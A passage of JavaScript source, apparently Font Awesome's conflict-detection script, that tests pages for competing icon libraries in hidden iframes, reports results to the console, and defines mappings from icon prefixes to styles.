          } else {
            console.error(e);
          }
        });
      };

      diagScript.innerText = "(".concat(diagScriptFun.toString(), ")('").concat(nodeUnderTestId, "', '").concat(md5ForScript, "', '").concat(parentOrigin, "');");

      diagFrame.onload = function () {
        diagFrame.contentWindow.addEventListener('error', silenceErrors, true);
        diagFrame.contentDocument.head.appendChild(diagScript);
        diagFrame.contentDocument.head.appendChild(scriptUnderTest);
      };

      domready(() => DOCUMENT.body.appendChild(diagFrame));
    }

    return scriptsByMD5;
  }

  function setDoneResults(_ref2) {
    let {
      nodesTested,
      nodesFound
    } = _ref2;
    WINDOW.FontAwesomeDetection = WINDOW.FontAwesomeDetection || {};
    WINDOW.FontAwesomeDetection.nodesTested = nodesTested;
    WINDOW.FontAwesomeDetection.nodesFound = nodesFound;
    WINDOW.FontAwesomeDetection.detectionDone = true;
  }

  function conflictDetection() {
    let report$$1 = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : () => {};
    const nodesTested = {
      conflict: {},
      noConflict: {}
    };

    WINDOW.onmessage = function (e) {
      if (WINDOW.location.origin === 'file://' || e.origin === WINDOW.location.origin) {
        if (e && e.data) {
          if (e.data.type === 'fontawesome-conflict') {
            nodesTested.conflict[e.data.md5] = e.data;
          } else if (e.data.type === 'no-conflict') {
            nodesTested.noConflict[e.data.md5] = e.data;
          }
        }
      }
    };

    const scriptsToTest = detectSvgConflicts(DOCUMENT.currentScript);
    const cssToTest = detectWebfontConflicts();
    const nodesFound = { ...scriptsToTest,
      ...cssToTest
    };
    const testCount = Object.keys(scriptsToTest).length + Object.keys(cssToTest).length; // The resultsCollectionMaxWait allows for the time between when the tests running under
    // child iframes call postMessage with their results, and when the parent window
    // receives and handles those events with window.onmessage.
    // Making it configurable allows us to test the scenario where this timeout is exceeded.
    // Naming it something very different from "timeout" is to help avoid the potential ambiguity between
    // these two timeout-related settings.

    const masterTimeout = WINDOW.FontAwesomeDetection.timeout + WINDOW.FontAwesomeDetection.resultsCollectionMaxWait;
    console.group('Font Awesome Detector');

    if (testCount === 0) {
      console.info('%cAll Good!', 'color: green; font-size: large');
      console.info('We didn\'t find anything that needs testing for conflicts. Ergo, no conflicts.');
    } else {
      console.info("Testing ".concat(testCount, " possible conflicts."));
      console.info("We'll wait about ".concat(Math.round(WINDOW.FontAwesomeDetection.timeout / 10) / 100, " seconds while testing these and\n") + "then up to another ".concat(Math.round(WINDOW.FontAwesomeDetection.resultsCollectionMaxWait / 10) / 100, " to allow the browser time\n") + "to accumulate the results. But we'll probably be outta here way before then.\n\n");
      console.info("You can adjust those durations by assigning values to these attributes on the <script> element that loads this detection:");
      console.info("\t%c".concat(timeoutAttr, "%c: milliseconds to wait for each test before deciding whether it's a conflict."), 'font-weight: bold;', 'font-size: normal;');
      console.info("\t%c".concat(resultsCollectionMaxWaitAttr, "%c: milliseconds to wait for the browser to accumulate test results before giving up."), 'font-weight: bold;', 'font-size: normal;');
      pollUntil({
        // Give this overall timer a little extra cushion
        maxDuration: masterTimeout,
        showProgress: true,
        progressIndicator: 'waiting...',
        fn: () => {
          return Object.keys(nodesTested.conflict).length + Object.keys(nodesTested.noConflict).length >= testCount;
        }
      }).then(() => {
        console.info('DONE!');
        setDoneResults({
          nodesTested,
          nodesFound
        });
        report$$1({
          nodesTested,
          nodesFound
        });
        console.groupEnd();
      }).catch(e => {
        if (e === 'timeout') {
          console.info('TIME OUT! We waited until we got tired. Here\'s what we found:');
          setDoneResults({
            nodesTested,
            nodesFound
          });
          report$$1({
            nodesTested,
            nodesFound
          });
        } else {
          console.info('Whoops! We hit an error:', e);
          console.info('Here\'s what we\'d found up until that error:');
          setDoneResults({
            nodesTested,
            nodesFound
          });
          report$$1({
            nodesTested,
            nodesFound
          });
        }

        console.groupEnd();
      });
    }
  } // Allow clients to access, and in some cases, override some properties

  const initialConfig = WINDOW.FontAwesomeDetection || {}; // These can be overridden

  const _default = {
    report,
    timeout: +(DOCUMENT.currentScript.getAttribute(timeoutAttr) || "2000"),
    resultsCollectionMaxWait: +(DOCUMENT.currentScript.getAttribute(resultsCollectionMaxWaitAttr) || "5000")
  };
  const _config = { ..._default,
    ...initialConfig,
    // These cannot be overridden
    __pollUntil: pollUntil,
    md5ForNode,
    detectionDone: false,
    nodesTested: null,
    nodesFound: null
  };
  WINDOW.FontAwesomeDetection = _config;

  var a = "classic",
      r = "sharp",
      o = "sharp-duotone";

  var et$1 = {
    classic: {
      900: "fas",
      400: "far",
      normal: "far",
      300: "fal",
      100: "fat"
    },
    sharp: {
      900: "fass",
      400: "fasr",
      300: "fasl",
      100: "fast"
    },
    "sharp-duotone": {
      900: "fasds"
    }
  };
  var bt = {
    kit: {
      fak: "kit",
      "fa-kit": "kit"
    },
    "kit-duotone": {
      fakd: "kit-duotone",
      "fa-kit-duotone": "kit-duotone"
    }
  };
  var lo = {
    classic: {
      "fa-brands": "fab",
      "fa-duotone": "fad",
      "fa-light": "fal",
      "fa-regular": "far",
      "fa-solid": "fas",
      "fa-thin": "fat"
    },
    sharp: {
      "fa-solid": "fass",
      "fa-regular": "fasr",
      "fa-light": "fasl",
      "fa-thin": "fast"
    },
    "sharp-duotone": {
      "fa-solid": "fasds"
    }
  },
      no = {
    classic: {
      fab: "fa-brands",
      fad: "fa-duotone",
      fal: "fa-light",
      far: "fa-regular",
      fas: "fa-solid",
      fat: "fa-thin"
    },
    sharp: {
      fass: "fa-solid",
      fasr: "fa-regular",
      fasl: "fa-light",
      fast: "fa-thin"
    },
    "sharp-duotone": {
      fasds: "fa-solid"
    }
  },
      fo = {
    classic: {
      solid: "fas",
      regular: "far",
      light: "fal",
      thin: "fat",
      duotone: "fad",
      brands: "fab"
    },
    sharp: {
      solid: "fass",
      regular: "fasr",
      light: "fasl",
      thin: "fast"
    },
    "sharp-duotone": {
      solid: "fasds"
    }
  },
      ho = {
    classic: {
      fa: "solid",
      fas: "solid",
      "fa-solid": "solid",
      far: "regular",
      "fa-regular": "regular",
      fal: "light",
      "fa-light": "light",
      fat: "thin",
      "fa-thin": "thin",
      fad: "duotone",
      "fa-duotone": "duotone",
      fab: "brands",
      "fa-brands": "brands"
    },
    sharp: {
      fa: "solid",
      fass: "solid",
      "fa-solid": "solid",
      fasr: "regular",
      "fa-regular": "regular",
      fasl: "light",
      "fa-light": "light",
      fast: "thin",
      "fa-thin": "thin"
    },
    "sharp-duotone": {
      fa: "solid",
      fasds: "solid",
      "fa-solid": "solid"
    }
  };
  var Io = {
    kit: {
      "fa-kit": "fak"
    },
    "kit-duotone": {
      "fa-kit-duotone": "fakd"
    }
  },
      Fo = {
    kit: {
      fak: "fa-kit"
    },
    "kit-duotone": {
      fakd: "fa-kit-duotone"
    }
  },
      So = {
    kit: {
      kit: "fak"
    },
    "kit-duotone": {
      "kit-duotone": "fakd"
    }
  };

  const PRODUCTION = (() => {
    try {
      return process.env.NODE_ENV === 'production';
    } catch (e$$1) {
      return false;
    }
  })();

  function familyProxy(obj) {
    // Defaults to the classic family if family is not available
    return new Proxy(obj, {
      get(target, prop) {
        return prop in target ? target[prop] : target[a];
      }

    });
  }

  const _PREFIX_TO_STYLE = { ...ho
  };
  _PREFIX_TO_STYLE[a] = { ...ho[a],
    ...bt['kit'],
    ...bt['kit-duotone']
  };
  const PREFIX_TO_STYLE = familyProxy(_PREFIX_TO_STYLE);
  const _STYLE_TO_PREFIX = { ...fo
  };
  _STYLE_TO_PREFIX[a] = { ..._STYLE_TO_PREFIX[a],
    ...So['kit'],
    ...So['kit-duotone']
  };
  const STYLE_TO_PREFIX = familyProxy(_STYLE_TO_PREFIX);
  const _PREFIX_TO_LONG_STYLE = { ...no
  };
  _PREFIX_TO_LONG_STYLE[a] = { ..._PREFIX_TO_LONG_STYLE[a],
    ...Fo['kit']
  };
  const PREFIX_TO_LONG_STYLE = familyProxy(_PREFIX_TO_LONG_STYLE);
  const _LONG_STYLE_TO_PREFIX = { ...lo
  };
  _LONG_STYLE_TO_PREFIX[a] = { ..._LONG_STYLE_TO_PREFIX[a],
    ...Io['kit']
  };
  const LONG_STYLE_TO_PREFIX = familyProxy(_LONG_STYLE_TO_PREFIX);
  const _FONT_WEIGHT_TO_PREFIX = { ...et$1
  };
  const FONT_WEIGHT_TO_PREFIX = familyProxy(_FONT_WEIGHT_TO_PREFIX);
  const prefixes = new Set();
  Object.keys(STYLE_TO_PREFIX[a]).map(prefixes.add.bind(prefixes));
  Object.keys(STYLE_TO_PREFIX[r]).map(prefixes.add.bind(prefixes));
  Object.keys(STYLE_TO_PREFIX[o]).map(prefixes.add.bind(prefixes));

  function bunker(fn) {
    try {
      for (var _len = arguments.length, args = new Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++) {
        args[_key - 1] = arguments[_key];
      }

      fn(...args);
    } catch (e) {
      if (!PRODUCTION) {
        throw e;
      }
    }
  }

  bunker(() => {
    if (IS_BROWSER && IS_DOM) {
      conflictDetection(window.FontAwesomeDetection.report);
    }
  });

})));
